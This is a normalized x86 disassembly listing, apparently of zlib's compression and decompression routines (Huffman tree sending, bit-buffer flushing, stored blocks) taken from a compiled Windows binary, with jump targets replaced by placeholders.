test eax eax
je r-xdata
add [ ebx + eax * 4 + 0xa74 ] di
jmp r-xdata
mov eax [ esp + 0x1c ]
add ebp 0x4
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
cmp edi 0xa
jg r-xdata
cmp eax [ esp + 0x10 ]
je r-xdata
xor edi edi
mov [ esp + 0x10 ] eax
test ecx ecx
jne r-xdata
mov eax ecx
xor ecx ecx
mov cx [ ebp ]
inc edi
cmp edi edx
jge r-xdata
pop ebp
inc [ ebx + 0xabc ]
inc [ ebx + 0xab8 ]
jmp r-xdata
inc [ ebx + 0xab4 ]
jmp r-xdata
inc [ ebx + eax * 4 + 0xa74 ]
cmp eax ecx
jne r-xdata
mov edx 0x8a
mov esi 0x3
jmp r-xdata
mov edx 0x7
mov esi 0x4
mov edx 0x6
mov esi 0x3
jmp r-xdata
sub_408930
push ebx
push ebp
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov ecx [ esi + 0x16b4 ]
cmp ecx 0xb
jle r-xdata
add eax 0xfffffeff
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x5
mov [ esi + 0x16b4 ] ecx
add eax 0xfffffeff
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b1 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edx [ esi + 0x16b4 ]
mov ebp [ esi + 0x14 ]
mov cx 0x10
sub cx dx
inc ebp
shr ax cl
add edx 0xfffffff5
mov [ esi + 0x14 ] ebp
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov eax [ esp + 0x1c ]
dec eax
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x5
mov [ esi + 0x16b4 ] ecx
mov edx [ esp + 0x1c ]
lea eax [ edx - 0x1 ]
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b1 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edx [ esi + 0x16b4 ]
mov ebp [ esi + 0x14 ]
mov cx 0x10
sub cx dx
inc ebp
shr ax cl
add edx 0xfffffff5
mov [ esi + 0x14 ] ebp
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov ecx [ esi + 0x16b4 ]
cmp ecx 0xb
jle r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x4
mov [ esi + 0x16b4 ] ecx
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b1 ]
mov [ ecx + edi ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff4
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov ecx [ esi + 0x16b4 ]
mov ebp [ esp + 0x20 ]
cmp ecx 0xc
lea eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ esp + 0x18 ]
lea ecx [ esi + 0x8c ]
dec eax
push eax
push ecx
push esi
call sub_408ba0
mov edx [ esp + 0x28 ]
lea eax [ esi + 0x980 ]
dec edx
push edx
push eax
push esi
call sub_408ba0
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi + 0x16b4 ]
cmp ecx 0xd
jle r-xdata
xor edi edi
test ebp ebp
jle r-xdata
xor eax eax
mov al [ edi + r--data ]
mov dx [ esi + eax * 4 + 0xa76 ]
shl dx cl
or [ esi + 0x16b0 ] dx
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
xor edx edx
xor eax eax
mov dl [ edi + r--data ]
mov ax [ esi + edx * 4 + 0xa76 ]
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b1 ]
mov [ ecx + ebx ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff3
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
inc edi
cmp edi ebp
jl r-xdata
sub_408ba0
sub esp 0x8
mov eax [ esp + 0x10 ]
push ebx
xor ebx ebx
xor edx edx
mov bx [ eax + 0x2 ]
push esi
test ebx ebx
push edi
mov [ esp + 0xc ] 0xffffffff
mov ecx 0x7
mov esi 0x4
jne r-xdata
mov edi [ esp + 0x20 ]
test edi edi
jl r-xdata
mov ecx 0x8a
mov esi 0x3
pop edi
pop esi
pop ebx
add esp 0x8
retn
add eax 0x6
inc edi
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x18 ]
push ebp
mov [ esp + 0x14 ] edi
cmp edx esi
jge r-xdata
cmp ebp ebx
je r-xdata
test ebp ebp
je r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + ebp * 4 + 0xa76 ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ebp [ esp + 0x24 ]
mov edi [ esp + 0x14 ]
add ebp 0x4
dec edi
mov [ esp + 0x24 ] ebp
mov [ esp + 0x14 ] edi
jne r-xdata
cmp edx 0xa
jg r-xdata
cmp ebp [ esp + 0x10 ]
je r-xdata
mov di [ eax + ebp * 4 + 0xa74 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + ebp * 4 + 0xa74 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov edi [ esp + 0x24 ]
mov ebp ebx
xor ebx ebx
inc edx
mov bx [ edi ]
cmp edx ecx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] edx
jge r-xdata
pop ebp
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + 0xabe ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + 0xaba ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + 0xab6 ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + ebp * 4 + 0xa76 ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
jmp r-xdata
dec edx
mov [ esp + 0x20 ] edx
jne r-xdata
mov di [ eax + 0xabc ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + 0xabc ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + 0xab8 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + 0xab8 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + 0xab4 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + 0xab4 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + ebp * 4 + 0xa74 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + ebp * 4 + 0xa74 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov ebx [ esp + 0x1c ]
xor edx edx
test ebx ebx
mov [ esp + 0x10 ] ebp
jne r-xdata
add edx 0xfffffff5
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x7
add edx 0xfffffff5
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff7
mov [ eax + 0x16b4 ] esi
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ eax + 0x16b4 ]
cmp ecx 0x9
jle r-xdata
add edx 0xfffffffd
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x3
jmp r-xdata
add edx 0xfffffffd
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff3
mov [ eax + 0x16b4 ] esi
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ eax + 0x16b4 ]
cmp ecx 0xd
jle r-xdata
add edx 0xfffffffd
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x2
jmp r-xdata
add edx 0xfffffffd
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff2
mov [ eax + 0x16b4 ] esi
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ eax + 0x16b4 ]
cmp ecx 0xe
jle r-xdata
dec edx
mov [ esp + 0x20 ] edx
cmp ebp ebx
jne r-xdata
mov ecx 0x8a
mov esi 0x3
jmp r-xdata
mov [ eax + 0x16b4 ] ecx
mov ecx 0x7
mov esi 0x4
mov ecx 0x6
mov esi 0x3
jmp r-xdata
sub_409120
mov eax [ esp + 0x4 ]
sub esp 0x8
xor ecx ecx
mov edx [ eax + 0x1698 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
test edx edx
je r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ ebp + 0x402 ]
mov edx 0x10
sub edx esi
cmp ecx edx
jle r-xdata
mov edx [ eax + 0x169c ]
xor edi edi
xor ebx ebx
mov di [ edx + ecx * 2 ]
mov edx [ eax + 0x1690 ]
mov bl [ ecx + edx ]
inc ecx
test edi edi
mov edx ebx
mov [ esp + 0x14 ] ecx
jne r-xdata
mov dx [ ebp + 0x400 ]
shl dx cl
or [ eax + 0x16b0 ] dx
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ ebp + 0x400 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor ebx ebx
mov ecx [ eax + 0x16b4 ]
mov bl [ edx + r--data ]
xor esi esi
mov [ esp + 0x1c ] ebx
mov si [ ebp + ebx * 4 + 0x406 ]
mov ebp 0x10
sub ebp esi
mov [ esp + 0x10 ] esi
cmp ecx ebp
jle r-xdata
mov di [ ebp + edx * 4 + 0x2 ]
mov ecx [ eax + 0x16b4 ]
mov esi 0x10
sub esi edi
cmp ecx esi
jle r-xdata
xor ecx ecx
pop edi
mov cx [ ebp + 0x402 ]
pop esi
pop ebp
mov [ eax + 0x16ac ] ecx
pop ebx
add esp 0x8
retn
mov ebp [ esp + 0x20 ]
mov bp [ ebp + ebx * 4 + 0x404 ]
shl bp cl
mov ecx [ eax + 0x16b4 ]
or [ eax + 0x16b0 ] bp
add ecx esi
mov [ eax + 0x16b4 ] ecx
mov ebp [ esp + 0x20 ]
xor esi esi
mov si [ ebp + ebx * 4 + 0x404 ]
mov ebp [ eax + 0x8 ]
mov ebx esi
shl ebx cl
or [ eax + 0x16b0 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b1 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr si cl
mov ecx [ esp + 0x10 ]
lea ecx [ ebx + ecx - 0x10 ]
mov ebx [ esp + 0x1c ]
mov [ eax + 0x16b0 ] si
mov [ eax + 0x16b4 ] ecx
jmp r-xdata
mov dx [ ebp + edx * 4 ]
shl dx cl
or [ eax + 0x16b0 ] dx
add ecx edi
jmp r-xdata
xor esi esi
mov si [ ebp + edx * 4 ]
mov edx esi
shl edx cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] dx
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ eax + 0x16b1 ]
mov [ ecx + ebx ] dl
mov ecx [ eax + 0x14 ]
mov edx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr si cl
lea ecx [ edx + edi - 0x10 ]
mov [ eax + 0x16b0 ] si
jmp r-xdata
dec edi
cmp edi 0x100
jae r-xdata
mov ecx [ ebx * 4 + r--data ]
mov ebx 0x10
sub edx ecx
mov ecx [ eax + 0x16b4 ]
sub ebx esi
cmp ecx ebx
jle r-xdata
mov esi [ ebx * 4 + r--data ]
test esi esi
je r-xdata
mov [ eax + 0x16b4 ] ecx
mov ecx edi
shr ecx 0x7
xor ebx ebx
mov bl [ ecx + r--data ]
xor ebx ebx
mov bl [ edi + r--data ]
jmp r-xdata
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx esi
mov [ eax + 0x16b4 ] ecx
mov ebx edx
mov ebp [ eax + 0x8 ]
shl ebx cl
or [ eax + 0x16b0 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b1 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ ebx + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov dx [ ebp + ebx * 4 ]
mov ebp [ esp + 0x20 ]
shl dx cl
or [ eax + 0x16b0 ] dx
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ ebp + ebx * 4 ]
mov ebp [ eax + 0x8 ]
mov ebx edx
shl ebx cl
or [ eax + 0x16b0 ] bx
mov ebx [ eax + 0x14 ]
mov cl [ eax + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ eax + 0x14 ]
inc ebx
xor ecx ecx
mov cl [ eax + 0x16b1 ]
mov [ eax + 0x14 ] ebx
mov ebp ebx
mov ebx [ eax + 0x8 ]
mov [ ebx + ebp ] cl
mov ecx [ eax + 0x14 ]
mov ebx [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx bx
mov ebp [ esp + 0x20 ]
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ ebx + esi - 0x10 ]
mov ebx [ esp + 0x1c ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ebp [ esp + 0x24 ]
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov edx 0x10
mov si [ ebp + ebx * 4 + 0x2 ]
mov [ esp + 0x1c ] ebx
sub edx esi
cmp ecx edx
jle r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ eax + 0x1698 ]
cmp ecx edx
jb r-xdata
mov ecx [ ebx * 4 + r--data ]
mov esi 0x10
sub edi ecx
mov ecx [ eax + 0x16b4 ]
sub esi edx
cmp ecx esi
jle r-xdata
mov edx [ ebx * 4 + r--data ]
test edx edx
je r-xdata
shl edi cl
or [ eax + 0x16b0 ] di
add ecx edx
mov esi edi
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
lea edx [ esi + edx - 0x10 ]
shr di cl
mov [ eax + 0x16b4 ] edx
mov [ eax + 0x16b0 ] di
jmp r-xdata
sub_409560
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
xor edi edi
xor edx edx
lea eax [ ebx + 0x8c ]
mov ecx 0x7
xor esi esi
mov si [ eax ]
add eax 0x4
add edx esi
dec ecx
jne r-xdata
push ebp
lea eax [ ebx + 0xa8 ]
mov ecx 0x79
mov esi 0x80
xor ebp ebp
mov bp [ eax ]
add eax 0x4
add edi ebp
dec ecx
jne r-xdata
cmp esi 0x100
pop ebp
jge r-xdata
shr edi 0x2
cmp edx edi
pop edi
setbe al
mov [ ebx + 0x1c ] al
pop esi
pop ebx
retn
mov eax 0x100
lea ecx [ ebx + esi * 4 + 0x8c ]
sub eax esi
xor esi esi
mov si [ ecx ]
add ecx 0x4
add edx esi
dec eax
jne r-xdata
sub_4095e0
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
xor eax eax
mov esi ecx
and esi 0x1
or eax esi
shr ecx 0x1
shl eax 0x1
dec edx
test edx edx
jg r-xdata
shr eax 0x1
pop esi
retn
sub_409600
mov eax [ esp + 0x4 ]
push ebx
push esi
mov edx [ eax + 0x16b4 ]
cmp edx 0x8
jle r-xdata
xor ecx ecx
cmp edx ecx
jle r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ eax + 0x16b1 ]
mov [ esi + ecx ] dl
mov ecx [ eax + 0x14 ]
inc ecx
pop esi
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax + 0x16b0 ] cx
mov [ eax + 0x16b4 ] ecx
pop ebx
retn
pop esi
mov [ eax + 0x16b0 ] cx
mov [ eax + 0x16b4 ] ecx
pop ebx
retn
mov edx [ eax + 0x8 ]
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ edx + esi ] bl
mov edx [ eax + 0x14 ]
inc edx
mov [ eax + 0x14 ] edx
sub_409680
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_409600
mov eax [ esp + 0x1c ]
add esp 0x4
test eax eax
mov eax [ esp + 0x14 ]
mov [ esi + 0x16ac ] 0x8
je r-xdata
mov edx eax
dec eax
test edx edx
je r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
mov [ ecx + edx ] al
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl ah
mov [ ecx + edi ] dl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
mov dl al
inc ecx
not dl
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edi [ esi + 0x14 ]
mov ecx eax
not ecx
xor edx edx
inc edi
mov dl ch
mov ecx [ esi + 0x8 ]
mov [ esi + 0x14 ] edi
mov [ edi + ecx ] dl
mov ecx [ esi + 0x14 ]
inc ecx
mov [ esi + 0x14 ] ecx
pop edi
pop esi
retn
lea ecx [ eax + 0x1 ]
mov eax [ esp + 0x10 ]
push ebx
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
mov bl [ eax ]
mov [ edx + edi ] bl
mov ebx [ esi + 0x14 ]
inc ebx
inc eax
dec ecx
mov [ esi + 0x14 ] ebx
jne r-xdata
pop ebx
sub_409720
mov eax [ esp + 0x14 ]
push 0x1c
push 0x1
mov ecx [ eax + 0x28 ]
push ecx
call [ eax + 0x20 ]
add esp 0xc
test eax eax
je r-xdata
retn
mov dl [ esp + 0x4 ]
mov cl [ esp + 0x8 ]
mov [ eax + 0x10 ] dl
mov edx [ esp + 0xc ]
mov [ eax + 0x11 ] cl
mov ecx [ esp + 0x10 ]
mov [ eax ] 0x0
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
sub_409760
sub esp 0x10
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
push edi
mov edi [ esp + 0x28 ]
mov edx [ esi + 0x20 ]
mov eax [ esi + 0x4 ]
mov ecx [ edi + 0x4 ]
mov ebp [ edi ]
mov ebx [ esi + 0x1c ]
mov [ esp + 0x28 ] ecx
mov ecx [ esi + 0x30 ]
mov [ esp + 0x24 ] edx
mov edx [ esi + 0x34 ]
mov [ esp + 0x10 ] eax
cmp edx ecx
jae r-xdata
mov ecx [ esi + 0x2c ]
sub ecx edx
sub ecx edx
dec ecx
jmp r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0xfffffffe
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
jmp [ ecx * 4 + jump_table_409ee0 ]
mov [ esp + 0x14 ] ecx
cmp [ esp + 0x14 ] 0x102
jb r-xdata
mov eax [ eax + 0xc ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0x8 ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0xc ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0x8 ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov ecx edx
sub ecx [ eax + 0xc ]
mov eax [ esi + 0x28 ]
cmp ecx eax
mov [ esp + 0x18 ] ecx
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
cmp ebx 0x7
jbe r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0x1
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
push 0xfffffffd
add ecx eax
push edi
mov [ edi + 0x8 ] ecx
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x10 ]
xor ecx ecx
mov cl [ eax + 0x10 ]
mov [ eax ] 0x1
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x14 ]
mov [ eax + 0x8 ] ecx
